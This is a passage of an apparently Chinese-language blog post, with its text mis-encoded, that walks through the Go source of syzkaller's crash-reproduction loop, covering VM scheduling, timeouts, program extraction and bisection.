&amp;&amp;<br>(<span class="hljs-type">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="hljs-number">1</span>)*instancesPerRepro &lt;= maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¸¤ä¸ªå°å¾ªç¯ï¼š</p><h4 id="â‘ -å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦-VM-è¿›è¡Œ-crash-å¤ç°"><a href="#â‘ -å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦-VM-è¿›è¡Œ-crash-å¤ç°" class="headerlink" title="â‘  å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦ VM è¿›è¡Œ crash å¤ç°"></a>â‘  å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦ VM è¿›è¡Œ crash å¤ç°</h4><p>ç¬¬ä¸€ä¸ªå°å¾ªç¯ä¼šå¾ªç¯åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ crash å¤ç°ï¼š</p><ul><li>è‹¥å¯ä»¥å¤ç°åˆ™ä»èµ„æºæ± é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ª VM idxï¼Œè‹¥èµ„æºæ± ä¸ºç©ºåˆ™ç›´æ¥è·³å‡º</li><li>ä» <code>reproQueue</code> ä¸­å–å‡ºä¸€ä¸ª crashï¼Œæ›´æ–° manager çš„ <code>numReproducing</code> è®¡æ•°</li><li>å¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹è°ƒç”¨ <code>runRepro()</code> å¯¹è¯¥ crash è¿›è¡Œå¤ç°ï¼Œç»“æœè¾“å‡ºè‡³ <code>reproDone</code> é˜Ÿåˆ—ä¸­</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> canRepro() &#123;<br>vmIndexes := instances.Take(instancesPerRepro)<br><span class="hljs-keyword">if</span> vmIndexes == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>last := <span class="hljs-built_in">len</span>(reproQueue) - <span class="hljs-number">1</span><br>crash := reproQueue[last]<br>reproQueue[last] = <span class="hljs-literal">nil</span><br>reproQueue = reproQueue[:last]<br>atomic.AddUint32(&amp;mgr.numReproducing, <span class="hljs-number">1</span>)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p> è€Œ <code>runRepro()</code> å…¶å®å°±æ˜¯ <code>repro.Run()</code> çš„ wrapper ï¼‹ ä¸€äº›é”™è¯¯æ£€æŸ¥åå°† VM idx æ”¾å›èµ„æºæ± ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runRepro(crash *Crash, vmIndexes []<span class="hljs-type">int</span>, putInstances <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(...<span class="hljs-type">int</span>)</span></span>) *ReproResult &#123;<br>features := mgr.checkResult.Features<br>res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p><code>Run()</code> ä¸€å¼€å§‹ä¸»è¦æ˜¯ä¸€äº›æ£€æŸ¥ï¼Œä¹‹åæ ¹æ® crash ç±»å‹çš„ä¸åŒè®¾ç½®ä¸åŒçš„å¤ç°æ—¶é—´ä¸Šé™ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Run</span><span class="hljs-params">(crashLog []<span class="hljs-type">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span><br><span class="hljs-params"><span class="hljs-function">vmPool *vm.Pool, vmIndexes []<span class="hljs-type">int</span>)</span></span> (*Result, *Stats, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmIndexes) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;no VMs provided&quot;</span>)<br>&#125;<br>entries := cfg.Target.ParseLog(crashLog)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;crash log does not contain any programs&quot;</span>)<br>&#125;<br>crashStart := <span class="hljs-built_in">len</span>(crashLog)<br>crashTitle, crashType := <span class="hljs-string">&quot;&quot;</span>, report.Unknown<br><span class="hljs-keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="hljs-literal">nil</span> &#123;<br>crashStart = rep.StartPos<br>crashTitle = rep.Title<br>crashType = rep.Type<br>&#125;<br>testTimeouts := []time.Duration&#123;<br><span class="hljs-number">3</span> * cfg.Timeouts.Program, <span class="hljs-comment">// ä»¥æ•è·æ›´ç®€å•çš„ crashes (å³ no races and no hangs)</span><br><span class="hljs-number">20</span> * cfg.Timeouts.Program,<br>cfg.Timeouts.NoOutputRunningTime, <span class="hljs-comment">// ä»¥æ•è· &quot;no output&quot;, races and hangs</span><br>&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> crashTitle == <span class="hljs-string">&quot;&quot;</span>:<br>crashTitle = <span class="hljs-string">&quot;no output/lost connection&quot;</span><br><span class="hljs-comment">// Lost connection å¯ä»¥è¢«æ›´å¿«åœ°æ£€æµ‹åˆ°,</span><br><span class="hljs-comment">// ä½†ç†è®ºä¸Šè‹¥å…¶ç”±ç«äº‰é€ æˆï¼Œåˆ™å¯èƒ½éœ€è¦æœ€é•¿çš„ timeout.</span><br><span class="hljs-comment">// No output ä»…èƒ½åœ¨æœ€å¤§çš„ timeout ä¸‹è¢«å¤ç°.</span><br><span class="hljs-comment">// ä½œä¸ºå¦¥åï¼Œæˆ‘ä»¬ä½¿ç”¨æœ€å°ä¸æœ€å¤§çš„ timeouts.</span><br>testTimeouts = []time.Duration&#123;testTimeouts[<span class="hljs-number">0</span>], testTimeouts[<span class="hljs-number">2</span>]&#125;<br><span class="hljs-keyword">case</span> crashType == report.MemoryLeak:<br><span class="hljs-comment">// ç”±äºæ˜‚è´µçš„è®¾ç½®ä¸æ‰«æï¼Œå†…å­˜æ³„éœ²ä¸èƒ½è¢«å¾ˆå¿«åœ°æ£€æµ‹åˆ°.</span><br>testTimeouts = testTimeouts[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">case</span> crashType == report.Hang:<br>testTimeouts = testTimeouts[<span class="hljs-number">2</span>:]<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šå°†å´©æºƒä¿¡æ¯å­˜å‚¨åˆ°ä¸€ä¸ª <code>context</code> ç»“æ„ä½“ä¸­ï¼Œå¹¶æ–°å»ºä¸€ä¸ª WaitGroupï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">ctx := &amp;context&#123;<br>target:       cfg.SysTarget,<br>reporter:     reporter,<br>crashTitle:   crashTitle,<br>crashType:    crashType,<br>instances:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *reproInstance, <span class="hljs-built_in">len</span>(vmIndexes)),<br>bootRequests: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(vmIndexes)),<br>testTimeouts: testTimeouts,<br>startOpts:    createStartOptions(cfg, features, crashType),<br>stats:        <span class="hljs-built_in">new</span>(Stats),<br>timeouts:     cfg.Timeouts,<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="hljs-built_in">len</span>(entries), <span class="hljs-built_in">len</span>(vmIndexes), testTimeouts)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(<span class="hljs-built_in">len</span>(vmIndexes))<br></code></pre></td></tr></table></figure><p>éšåå¾ªç¯è·å–ç”¨ä»¥å¤ç°çš„ VM idx å¹¶ä¾æ¬¡å¯åŠ¨æ–°åç¨‹è°ƒç”¨ <code>CreateExecProgInstance()</code> <strong>åˆ›å»º VM å¹¶æ‹·è´ crash ç¨‹åº</strong>ï¼Œè‹¥å¤±è´¥åˆ™ä¼‘çœ  10s åé‡è¯•ï¼Œæœ€å¤šä¼šå°è¯• <code>maxTry</code> æ¬¡ï¼›æˆåŠŸçš„ç»“æœä¼šè¾“å‡ºåˆ° <code>ctx.instances</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, vmIndex := <span class="hljs-keyword">range</span> vmIndexes &#123;<br>ctx.bootRequests &lt;- vmIndex<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> vmIndex := <span class="hljs-keyword">range</span> ctx.bootRequests &#123;<br><span class="hljs-keyword">var</span> inst *instance.ExecProgInstance<br>maxTry := <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; try &lt; maxTry; try++ &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-vm.Shutdown:<br>try = maxTry<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,<br>reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to init instance: %v&quot;</span>, err)<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> inst == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// ä¸€äº›æ”¶å°¾å·¥ä½œ...</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ctx.instances)<br>&#125;()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ctx.bootRequests)<br><span class="hljs-keyword">for</span> inst := <span class="hljs-keyword">range</span> ctx.instances &#123;<br>inst.execProg.VMInstance.Close()<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>CreateExecProgInstance()</code> ä¸»è¦å°±æ˜¯è°ƒç”¨ <code>vmPool.Create()</code> å¯åŠ¨è™šæ‹Ÿæœºåè°ƒç”¨ <code>SetupExecProg()</code> æ‹·è´è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateExecProgInstance</span><span class="hljs-params">(vmPool *vm.Pool, vmIndex <span class="hljs-type">int</span>, mgrCfg *mgrconfig.Config,</span></span><br><span class="hljs-params"><span class="hljs-function">reporter *report.Reporter, opt *OptionalConfig)</span></span> (*ExecProgInstance, <span class="hljs-type">error</span>) &#123;<br>vmInst, err := vmPool.Create(vmIndex)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create VM: %v&quot;</span>, err)<br>&#125;<br>ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInst.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> ret, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ° <code>Run()</code>  ä¸­ï¼Œå…¶æœ€åä¼šè°ƒç”¨ <code>context.repro()</code> <strong>æ­£å¼å¼€å§‹å¤ç° crash çš„å·¥ä½œ</strong>ï¼Œæ£€æŸ¥ç»“æœåè¿”å›ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go">res, err := ctx.repro(entries, crashStart)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br><span class="hljs-comment">// Try to rerun the repro if the report is corrupted.</span><br><span class="hljs-keyword">for</span> attempts := <span class="hljs-number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="hljs-number">3</span>; attempts++ &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;report is corrupted, running repro again&quot;</span>)<br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br>res.Report = ctx.report<br>&#125;<br><span class="hljs-keyword">return</span> res, ctx.stats, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>repro()</code> å‡½æ•°ä¸»è¦åˆ†ä¸¤éƒ¨åˆ†ï¼š</p><ul><li><p>è°ƒç”¨ <code>extractProg()</code> <strong>è·å–è§¦å‘ crash çš„ç¨‹åºé›†åˆ</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> repro(entries []*prog.LogEntry, crashStart <span class="hljs-type">int</span>) (*Result, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// å»é™¤åœ¨ crash å‘ç”Ÿåæ‰§è¡Œçš„ç¨‹åº.</span><br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br><span class="hljs-keyword">if</span> ent.Start &gt; crashStart &#123;<br>entries = entries[:i]<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br>reproStart := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))<br>&#125;()<br><br>res, err := ctx.extractProg(entries)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>res.Opts.Repro = <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure></li><li><p>æœ€å°åŒ–ç¨‹åºé›†åˆå¹¶å°è¯•ç”Ÿæˆå¯ä»¥è§¦å‘è¯¥ crash çš„ C ç¨‹åºï¼Œè¿”å›ç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// å°è¯•æœ€å°åŒ–ç¨‹åºé›†</span><br>res, err = ctx.minimizeProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// é¦–å…ˆå°è¯•åœ¨ä¸ç®€åŒ–é…ç½®çš„æƒ…å†µä¸‹æå– C repro.</span><br>res, err = ctx.extractC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// ç®€åŒ–é…ç½®å¹¶å°è¯•æå– C repro.</span><br><span class="hljs-keyword">if</span> !res.CRepro &#123;<br>res, err = ctx.simplifyProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// ç®€åŒ– C ç›¸å…³çš„é…ç½®.</span><br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>res, err = ctx.simplifyC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><code>extractProg()</code> çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>é€†åºåè°ƒç”¨ <code>context.extractProgSingle()</code> <strong>é€ä¸ªè¿è¡Œå•ä¸ªç¨‹åº</strong>ï¼Œè‹¥æŸä¸€ç¨‹åºè§¦å‘äº† crash åˆ™ç›´æ¥è¿”å›</li><li>è‹¥å•ä¸€ç¨‹åºæ— æ³•è§¦å‘ crashï¼Œåˆ™è°ƒç”¨ <code>context.extractProgBisect()</code> <strong>ä½¿ç”¨äºŒåˆ†æ³•æ‰¾å‡ºè§¦å‘ crash çš„ç¨‹åºé›†åˆ</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> extractProg(entries []*prog.LogEntry) (*Result, <span class="hljs-type">error</span>) &#123;<br>ctx.reproLogf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="hljs-built_in">len</span>(entries))<br>start := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.stats.ExtractProgTime = time.Since(start)<br>&#125;()<br><br><span class="hljs-comment">// Extract last program on every proc.</span><br>procs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br>procs[ent.Proc] = i<br>&#125;<br><span class="hljs-keyword">var</span> indices []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, idx := <span class="hljs-keyword">range</span> procs &#123;<br>indices = <span class="hljs-built_in">append</span>(indices, idx)<br>&#125;<br>sort.Ints(indices)<br><span class="hljs-keyword">var</span> lastEntries []*prog.LogEntry<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(indices) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i-- &#123;<br>lastEntries = <span class="hljs-built_in">append</span>(lastEntries, entries[indices[i]])<br>&#125;<br><span class="hljs-keyword">for</span> _, timeout := <span class="hljs-keyword">range</span> ctx.testTimeouts &#123;<br><span class="hljs-comment">// åˆ†åˆ«æ‰§è¡Œæ¯ä¸ªç¨‹åºä»¥æ£€æµ‹ç”±å•ä¸ªç¨‹åºé€ æˆçš„ç®€å•çš„ crash.</span><br><span class="hljs-comment">// ç¨‹åºè¢«é€†åºæ‰§è¡Œ, é€šå¸¸æœ€åä¸€ä¸ªç¨‹åºå°±æ˜¯ç½ªé­ç¥¸é¦–.</span><br>res, err := ctx.extractProgSingle(lastEntries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// è‹¥åªæœ‰ä¸€ä¸ª entry åˆ™ä¸è¿›è¡ŒäºŒåˆ†.</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// æ‰§è¡Œå¤šä¸ªç¨‹åºå¹¶äºŒåˆ† log ä»¥æ‰¾åˆ°é€ æˆå´©æºƒçš„å¤šä¸ªç¨‹åº.</span><br>res, err = ctx.extractProgBisect(entries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to extract reproducer&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯é€šè¿‡å¦‚ä¸‹è°ƒç”¨é“¾æ¥åœ¨ VM 